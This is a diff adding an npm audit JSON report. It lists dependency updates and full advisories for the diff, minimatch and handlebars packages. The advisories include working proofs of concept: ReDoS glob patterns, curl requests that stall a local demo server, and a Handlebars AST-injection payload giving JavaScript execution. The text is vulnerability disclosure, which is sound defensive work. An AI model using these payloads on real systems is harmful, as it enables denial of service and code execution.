@@ -1,0 +1,857 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112704,
+          "path": ".>jest>@jest/core>jest-config>ts-node>diff",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "diff",
+      "target": "4.0.4",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115538,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115539,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115544,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115588,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115589,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115693,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115694,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1117465,
+          "path": ".>ts-jest>handlebars",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "handlebars",
+      "target": "4.7.9",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115540,
+          "path": ".>jest>@jest/core>@jest/reporters>glob>minimatch>brace-expansion",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "brace-expansion",
+      "target": "1.1.15",
+      "depth": 7
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1115549,
+          "path": ".>@types/jest>expect>jest-message-util>micromatch>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115552,
+          "path": ".>@types/jest>expect>jest-message-util>micromatch>picomatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "picomatch",
+      "target": "2.3.2",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1119610,
+          "path": ".>ioredis-mock>fengari>tmp",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "tmp",
+      "target": "0.2.7",
+      "depth": 4
+    },
+    {
+      "action": "review",
+      "module": "minimatch",
+      "resolves": [
+        {
+          "id": 1113459,
+          "path": ".>jest>@jest/core>@jest/reporters>glob>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113538,
+          "path": ".>jest>@jest/core>@jest/reporters>glob>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1113546,
+          "path": ".>jest>@jest/core>@jest/reporters>glob>minimatch",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "ws",
+      "resolves": [
+        {
+          "id": 1119108,
+          "path": ".>viem>ws",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1112704": {
+      "findings": [
+        {
+          "version": "4.0.2",
+          "paths": [
+            ".>jest>@jest/core>jest-config>ts-node>diff"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/kpdecker/jsdiff/security/advisories/GHSA-73rr-hh4g-fpgx\n- https://github.com/kpdecker/jsdiff/pull/649\n- https://github.com/kpdecker/jsdiff/commit/15a1585230748c8ae6f8274c202e0c87309142f5\n- https://github.com/kpdecker/jsdiff/issues/653\n- https://nvd.nist.gov/vuln/detail/CVE-2026-24001\n- https://github.com/advisories/GHSA-73rr-hh4g-fpgx",
+      "created": "2026-01-14T21:34:12.000Z",
+      "id": 1112704,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nAttempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649\n\n\n### CVE Notes\n\nNote that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability.",
+      "reported_by": null,
+      "title": "jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-24001"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "diff",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-73rr-hh4g-fpgx",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-01-30T17:13:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-73rr-hh4g-fpgx"
+    },
+    "1113459": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            ".>jest>@jest/core>@jest/reporters>glob>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26\n- https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26996\n- https://github.com/advisories/GHSA-3ppc-4f35-3m26",
+      "created": "2026-02-18T22:38:11.000Z",
+      "id": 1113459,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input\n\n----\n\nThanks to @ljharb for back-porting the fix to legacy versions of minimatch.",
+      "reported_by": null,
+      "title": "minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26996"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<3.1.3",
+      "github_advisory_id": "GHSA-3ppc-4f35-3m26",
+      "recommendation": "Upgrade to version 3.1.3 or later",
+      "patched_versions": ">=3.1.3",
+      "updated": "2026-02-24T20:59:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3ppc-4f35-3m26"
+    },
+    "1113538": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            ".>jest>@jest/core>@jest/reporters>glob>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27903\n- https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748\n- https://github.com/advisories/GHSA-7r86-cg39-jmmj",
+      "created": "2026-02-26T22:10:18.000Z",
+      "id": 1113538,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.\n\n---\n\n### Details\n\nThe vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):\n\n```typescript\nwhile (fr < fl) {\n  ..\n  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {\n    ..\n    return true\n  }\n  ..\n  fr++\n}\n```\n\nWhen a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).\n\nThere is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.\n\nMeasured timing with n=30 path segments:\n\n| k (globstars) | Pattern size | Time     |\n|---------------|--------------|----------|\n| 7             | 36 bytes     | ~154ms   |\n| 9             | 46 bytes     | ~1.2s    |\n| 11            | 56 bytes     | ~5.4s    |\n| 12            | 61 bytes     | ~9.7s    |\n| 13            | 66 bytes     | ~15.9s   |\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- inline script**\n\n```javascript\nimport { minimatch } from 'minimatch'\n\n// k=9 globstars, n=30 path segments\n// pattern: 46 bytes, default options\nconst pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'\nconst path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'\n\nconst start = Date.now()\nminimatch(path, pattern)\nconsole.log(Date.now() - start + 'ms') // ~1200ms\n```\n\nTo scale the effect, increase k:\n\n```javascript\n// k=11 -> ~5.4s, k=13 -> ~15.9s\nconst k = 11\nconst pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'\nconst path    = Array(30).fill('a').join('/')\nminimatch(path, pattern)\n```\n\nNo special options are required. This reproduces with the default `minimatch()` call.\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nThe following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:\n\n```javascript\n// poc1-server.mjs\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3000\n\nconst server = http.createServer((req, res) => {\n  const url = new URL(req.url, `http://localhost:${PORT}`)\n  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }\n\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n})\n\nserver.listen(PORT)\n```\n\nTerminal 1 -- start the server:\n```\nnode poc1-server.mjs\n```\n\nTerminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:\n```\ncurl \"http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa\" &\n```\n\nTerminal 3 -- while the attack is in-flight, send a benign request:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz\"\n```\n\n**Observed output (Terminal 3):**\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 4.132709s\n```\n\nThe server reports `\"ms\":\"0\"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:\n\n```\n{\"result\":true,\"ms\":\"0\"}\n\ntime_total: 0.001599s\n```\n\n---\n\n### Impact\n\nAny application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.",
+      "reported_by": null,
+      "title": "minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27903"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<3.1.3",
+      "github_advisory_id": "GHSA-7r86-cg39-jmmj",
+      "recommendation": "Upgrade to version 3.1.3 or later",
+      "patched_versions": ">=3.1.3",
+      "updated": "2026-02-26T22:10:20.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-7r86-cg39-jmmj"
+    },
+    "1113546": {
+      "findings": [
+        {
+          "version": "3.1.2",
+          "paths": [
+            ".>jest>@jest/core>@jest/reporters>glob>minimatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27904\n- https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce\n- https://github.com/advisories/GHSA-23c5-xmqv-rm74",
+      "created": "2026-02-26T22:07:15.000Z",
+      "id": 1113546,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\n---\n\n### Details\n\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\n```typescript\n: this.type === '*' && bodyDotAllowed ? `)?`\n: `)${this.type}`\n```\n\nThis produces the following regexps:\n\n| Pattern              | Generated regex                          |\n|----------------------|------------------------------------------|\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\nMeasured times via `minimatch()`:\n\n| Pattern              | Input              | Time       |\n|----------------------|--------------------|------------|\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\nDepth inflection at fixed input `a` x16 + `z`:\n\n| Depth | Pattern              | Time         |\n|-------|----------------------|--------------|\n| 1     | `*(a\\|b)`            | 0ms          |\n| 2     | `*(*(a\\|b))`         | 4ms          |\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- verify the generated regexps and timing (standalone script)**\n\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\n```javascript\nimport { minimatch, Minimatch } from 'minimatch'\n\nfunction timed(fn) {\n  const s = process.hrtime.bigint()\n  let result, error\n  try { result = fn() } catch(e) { error = e }\n  const ms = Number(process.hrtime.bigint() - s) / 1e6\n  return { ms, result, error }\n}\n\n// Verify generated regexps\nfor (let depth = 1; depth <= 4; depth++) {\n  let pat = 'a|b'\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\n}\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\nconst cases = [\n  ['*(*(*(a|b)))', 15],   // ~270ms\n  ['*(*(*(a|b)))', 17],   // ~800ms\n  ['*(*(*(a|b)))', 19],   // ~2400ms\n  ['*(*(a|b))',    23],   // ~260ms\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\n]\nfor (const [pat, n] of cases) {\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n}\n\n// Confirm noext disables the vulnerability\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\n// +() is equally affected\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n```\n\nObserved output:\n```\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\"*(*(*(a|b)))\" n=15: 269ms result=false\n\"*(*(*(a|b)))\" n=17: 268ms result=false\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\n\"*(*(a|b))\"    n=23: 257ms result=false\n\"*(a|b)\"       n=101: 0ms result=false\nnoext=true: 0ms (should be ~0ms)\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\n```\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nSave as `poc4-server.mjs`:\n\n```javascript\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3001\nhttp.createServer((req, res) => {\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\n```\n\nTerminal 1 -- start the server:\n```\nnode poc4-server.mjs\n```\n\nTerminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n```\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\n```\n\nTerminal 3 -- send a benign request while the attack is in-flight:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\n```\n\n**Observed output -- Terminal 2 (attack):**\n```\n{\"result\":false,\"ms\":\"64149\"}\n```\n\n**Observed output -- Terminal 3 (benign, concurrent):**\n```\n{\"result\":false,\"ms\":\"0\"}\n\ntime_total: 63.022047s\n```\n\n**Terminal 1 (server log):**\n```\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\n```\n\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\n---\n\n### Impact\n\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",
+      "reported_by": null,
+      "title": "minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27904"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<3.1.4",
+      "github_advisory_id": "GHSA-23c5-xmqv-rm74",
+      "recommendation": "Upgrade to version 3.1.4 or later",
+      "patched_versions": ">=3.1.4",
+      "updated": "2026-02-26T22:07:15.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-23c5-xmqv-rm74"
+    },
+    "1115538": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-3mfm-83xf-c92r\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33938\n- https://github.com/advisories/GHSA-3mfm-83xf-c92r",
+      "created": "2026-03-27T18:20:44.000Z",
+      "id": 1115538,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe `@partial-block` special variable is stored in the template data context and is reachable and mutable from within a template via helpers that accept arbitrary objects. When a helper overwrites `@partial-block` with a crafted Handlebars AST, a subsequent invocation of `{{> @partial-block}}` compiles and executes that AST, enabling arbitrary JavaScript execution on the server.\n\n## Description\n\nHandlebars stores `@partial-block` in the `data` frame that is accessible to templates. In nested contexts, a parent frame's `@partial-block` is reachable as `@_parent.partial-block`. Because the data frame is a mutable object, any registered helper that accepts an object reference and assigns properties to it can overwrite `@partial-block` with an attacker-controlled value.\n\nWhen `{{> @partial-block}}` is subsequently evaluated, `invokePartial` receives the crafted object. The runtime, finding an object that is not a compiled function, falls back to **dynamically compiling** the value via `env.compile()`. If that value is a well-formed Handlebars AST containing injected code, the injected JavaScript runs in the server process.\n\nThe `handlebars-helpers` npm package (commonly used with Handlebars) includes several helpers such as `merge` that can be used as the mutation primitive.\n\n## Proof of Concept\n\nTested with Handlebars 4.7.8 and `handlebars-helpers`:\n\n```javascript\nconst Handlebars = require('handlebars');\nconst merge = require('handlebars-helpers').object().merge;\nHandlebars.registerHelper('merge', merge);\n\nconst vulnerableTemplate = `\n{{#*inline \"myPartial\"}}\n    {{>@partial-block}}\n    {{>@partial-block}}\n{{/inline}}\n{{#>myPartial}}\n    {{merge @_parent partial-block=1}}\n    {{merge @_parent partial-block=payload}}\n{{/myPartial}}\n`;\n\nconst maliciousContext = {\n  payload: {\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Code injected via depth field — breaks out of generated function call\n          depth: \"0])),function () {console.error('VULNERABLE: RCE via @partial-block');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: RCE via @partial-block\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). The `compile()` method is  absent, eliminating the vulnerable fallback path.\n- **Audit registered helpers** for any that write arbitrary values to context objects. Helpers  should treat context data as read-only.\n- **Avoid registering helpers** from third-party packages (such as `handlebars-helpers`) in  contexts where templates or context data can be influenced by untrusted input.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion by tampering @partial-block",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33938"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-3mfm-83xf-c92r",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:26.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-3mfm-83xf-c92r"
+    },
+    "1115539": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
